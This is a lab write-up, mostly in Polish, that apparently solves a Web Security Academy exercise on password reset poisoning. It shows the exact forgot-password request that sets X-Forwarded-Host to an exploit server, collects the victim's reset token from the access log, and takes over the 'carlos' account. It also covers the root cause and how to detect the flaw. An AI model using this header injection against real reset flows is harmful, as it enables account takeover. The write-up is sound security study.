```md
LAB: Password reset poisoning via middleware  
Kategoria: Authentication / Host Header Injection  
Utworzono: 2026-04-22 18:05 (Europe/Amsterdam)

---

1. SCAN (Entry & Signals)

   Endpoint:
   - POST /forgot-password

   Controllable input:
   - X-Forwarded-Host
   - Host / X-Host
   - username

   Signals:
   - reset password flow
   - token w URL:
     - /forgot-password?temp-forgot-password-token=XYZ
   - email z linkiem resetu
   - obecność forwarded headers (proxy / middleware)

---

2. LOCK (Vector)

   Vector:
   - X-Forwarded-Host

   Why this:
   - backend używa headera do budowy absolutnego URL

---

3. PRESS (Exact Steps)

   Step 1 – Trigger reset

   - przejdź do /forgot-password
   - podaj:
     - username: carlos

   Step 2 – Modyfikacja requestu

   Dodaj header:
   X-Forwarded-Host: <exploit-id>.exploit-server.net

   Final request:

   POST /forgot-password HTTP/2
   Host: <lab-id>.web-security-academy.net
   X-Forwarded-Host: <exploit-id>.exploit-server.net
   Content-Type: application/x-www-form-urlencoded

   username=carlos

---

4. BREAK (Proof)

   Oczekiwane:

   - link resetu wskazuje na:
     - exploit-server (nie lab)

   LUB

   - request ofiary pojawia się w Access log:

     GET /forgot-password?temp-forgot-password-token=XYZ

---

5. POST (Exploit Path)

   Step 1 – Pobranie tokena

   - Exploit server → Access log
   - znajdź:
     - temp-forgot-password-token=XYZ

   Step 2 – Użycie tokena

   - otwórz:
     - /forgot-password?temp-forgot-password-token=XYZ (na labie)

   Step 3 – Reset

   - ustaw nowe hasło dla:
     - carlos

   Step 4 – Login

   - zaloguj się jako carlos

   ➜ LAB SOLVED

---

6. ROOT CAUSE

   Backend:

   - buduje URL na podstawie:
     - X-Forwarded-Host / Host

   Problem:

   - brak walidacji hosta
   - zaufanie do user-controlled danych

   Trust break:

   - user input → security-sensitive URL

---

7. PATTERN (Reusable)

   Name:
   - Password reset poisoning
   - Host header injection

   Conditions:
   - token w URL
   - link wysyłany do usera
   - absolutny URL budowany dynamicznie
   - brak whitelisty hosta

---

8. PITFALLS (My mistakes)

   - skupienie na emailu zamiast URL
   - użycie:
     - wiener zamiast carlos
   - patrzenie na response zamiast:
     - email / access log
   - mylenie /email endpoint z reset flow

---

9. DETECTION (Fast trigger)

   Sygnały:

   - reset / activation / magic link
   - token w URL
   - absolutne linki w mailach
   - forwarded headers

   Testy:

   - dodaj:
     - X-Forwarded-Host
   - sprawdź:
     - gdzie prowadzi link
     - czy token trafia do logów

---

10. REPLAY (🔥 EXEC)

   1. znajdź:
      - /forgot-password

   2. wyślij:
      - username=carlos

   3. dodaj:
      - X-Forwarded-Host: exploit-server

   4. sprawdź:
      - Access log → token

   5. użyj:
      - token → reset → login

---

11. TAKEAWAY

   Aplikacja wysyła token resetu na domenę atakującego przez zaufanie do headerów.
```
